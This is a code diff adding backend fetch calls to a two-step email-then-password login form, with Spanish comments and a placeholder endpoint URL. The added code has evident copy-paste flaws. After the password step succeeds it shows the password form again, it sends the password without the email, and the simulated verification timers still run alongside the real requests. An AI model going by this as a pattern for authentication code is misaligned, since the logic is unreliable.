@@ -106,6 +106,31 @@ loginFormElement.addEventListener('submit', function (e) {
         return;
     }
 
+    fetch('URL_DEL_ENDPOINT', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email: email })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Error en la solicitud');
+        }
+        return response.json();
+    })
+    .then(data => {
+        // Procesa la respuesta del servidor
+        if (data.success) {
+            showPasswordForm(email);
+        } else {
+            showError('login', data.message || 'Error en la autenticación');
+        }
+    })
+    .catch(error => {
+        showError('login', error.message);
+    });
+
     // Simular verificación de usuario existente
     setTimeout(() => {
         showPasswordForm(email);
@@ -126,6 +151,31 @@ passwordFormElement.addEventListener('submit', function (e) {
         showError('password', 'Tu contraseña es incorrecta');
         return;
     }
+
+    fetch('URL_DEL_ENDPOINT', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ password: password })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Error en la solicitud');
+        }
+        return response.json();
+    })
+    .then(data => {
+        // Procesa la respuesta del servidor
+        if (data.success) {
+            showPasswordForm(email);
+        } else {
+            showError('login', data.message || 'Error en la autenticación');
+        }
+    })
+    .catch(error => {
+        showError('login', error.message);
+    });
 
     // Simular autenticación
     setTimeout(() => {
